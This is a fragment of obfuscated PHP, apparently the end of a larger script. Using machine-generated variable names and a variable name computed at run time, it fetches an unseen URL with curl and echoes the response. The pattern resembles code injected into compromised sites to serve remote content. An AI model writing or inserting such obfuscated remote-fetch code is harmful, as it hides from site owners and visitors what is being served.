$mystr1s2237 = 5;curl_setopt($mystr1s2236,CURLOPT_URL,$mystr1s2235);curl_setopt($mystr1s2236,CURLOPT_RETURNTRANSFER,1);curl_setopt($mystr1s2236,CURLOPT_CONNECTTIMEOUT,$mystr1s2237);
$mystr1s2238 = curl_exec($mystr1s2236);curl_close(${mystr1s76("mystr1s382")});echo "$mystr1s2238";}
?>